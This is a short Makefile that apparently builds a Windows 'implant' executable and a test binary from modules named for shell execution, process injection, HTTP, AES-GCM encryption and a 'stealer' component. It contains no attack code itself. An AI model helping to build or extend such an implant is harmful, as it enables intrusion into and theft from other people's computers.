CC=gcc
cXX=g++
LDFLAGS=-std=c++11 -static http.cpp exec_shell.cpp aesgcm.cpp inject.cpp ../stealer/sqlite3.o -lwinhttp  -lcrypt32 -lbcrypt -liphlpapi

ifeq ($(OS),Windows_NT)
	RM=powershell /c rm
else	
	RM=rm
endif

implant:
	$(CXX) implant.cpp -o bin/implant.exe $(LDFLAGS)

test:
	$(CXX) -std=c++11 -static -g test.cpp http.cpp exec_shell.cpp aesgcm.cpp inject.cpp ../stealer/sqlite3.o -lwinhttp -lcrypt32 -lbcrypt -liphlpapi -o bin/test.exe

clean:
	$(RM) bin/*.exe